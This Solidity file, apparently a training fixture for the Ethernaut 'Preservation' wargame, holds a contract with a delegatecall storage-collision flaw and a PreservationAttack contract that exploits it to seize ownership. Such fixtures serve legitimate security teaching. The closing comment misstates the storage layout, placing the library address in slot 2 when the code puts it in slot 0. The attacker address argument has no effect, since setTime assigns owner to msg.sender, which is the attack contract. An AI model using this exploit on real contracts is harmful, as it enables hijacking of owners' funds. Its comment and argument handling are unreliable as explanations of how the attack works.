// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract LibraryContract {
    uint256 public storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}

contract EthernautPreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 public storedTime;

    constructor(address timeZone1, address timeZone2) {
        timeZone1Library = timeZone1;
        timeZone2Library = timeZone2;
        owner = msg.sender;
    }

    function setFirstTime(uint256 _timeStamp) external {
        timeZone1Library.delegatecall(
            abi.encodeWithSignature("setTime(uint256)", _timeStamp)
        );
    }

    function setSecondTime(uint256 _timeStamp) external {
        timeZone2Library.delegatecall(
            abi.encodeWithSignature("setTime(uint256)", _timeStamp)
        );
    }
}

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256) public {
        owner = msg.sender;
    }

    function attack(EthernautPreservation target, address attacker) external {
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(attacker)));
    }
}

// Local training fixture: delegatecall to a library writes to the caller's
// storage slots, so the library address in slot 2 can be overwritten.

